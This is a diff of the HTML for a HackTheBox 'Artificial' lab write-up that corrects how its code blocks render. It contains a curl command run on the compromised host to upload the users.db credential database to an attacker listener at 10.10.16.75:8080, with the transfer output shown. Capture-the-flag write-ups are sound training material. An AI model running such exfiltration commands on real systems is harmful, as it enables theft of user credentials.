@@ -788,31 +788,33 @@ app@artificial:~/app<span class="nv">$ </span>
 </code></pre></div>    </div>
   </li>
   <li>On compromise host:
-```shell
-curl -X POST http://10.10.16.75:8080/ -F “file=@users.db;type=application/octet-stream”
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST http://10.10.16.75:8080/ <span class="nt">-F</span> <span class="s2">"file=@users.db;type=application/octet-stream"</span>
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                Dload  Upload   Total   Spent    Left  Speed
-100 25002    0   226  100 24776    142  15661  0:00:01  0:00:01 –:–:– 15804
-&lt;!DOCTYPE html&gt;</li>
+100 25002    0   226  100 24776    142  15661  0:00:01  0:00:01 <span class="nt">--</span>:--:-- 15804
+&amp;lt<span class="p">;</span><span class="o">!</span>DOCTYPE html&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span>html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span>&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span><span class="nb">head</span>&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span>meta http-equiv<span class="o">=</span><span class="s2">"refresh"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"3;url=/"</span> <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span>&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span>title&amp;gt<span class="p">;</span>Redirecting...&amp;lt<span class="p">;</span>/title&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span>/head&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span>body&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span>p&amp;gt<span class="p">;</span>File uploaded successfully. Redirecting <span class="k">in </span>3 seconds...&amp;lt<span class="p">;</span>/p&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span>/body&amp;gt<span class="p">;</span>
+&amp;lt<span class="p">;</span>/html&amp;gt<span class="p">;</span>
+</code></pre></div>    </div>
+  </li>
 </ul>
-<html lang="en">
-<head>
-<meta http-equiv="refresh" content="3;url=/" charset="utf-8" />
-<title>Redirecting...</title>
-</head>
-<body>
-<p>File uploaded successfully. Redirecting in 3 seconds...</p>
-</body>
-</html>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-&lt;div align="center"&gt;
-&lt;img src="/assets/images/writeups/hackthebox/Artificial/Pasted image 20250725231255.png" alt="File upload successful" width="1000" height="900" class="writeup-img"&gt;
-&lt;/div&gt;
 
-- Now time to analyze users.db:
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Pasted image 20250725231255.png" alt="File upload successful" width="1000" height="900" class="writeup-img" /></p>
+</div>
 
-```shell
-&gt; file users.db
+<ul>
+  <li>Now time to analyze users.db:</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> file users.db
 users.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 55, database pages 6, cookie 0x2, schema 4, UTF-8, version-valid-for 55
 </code></pre></div></div>
 
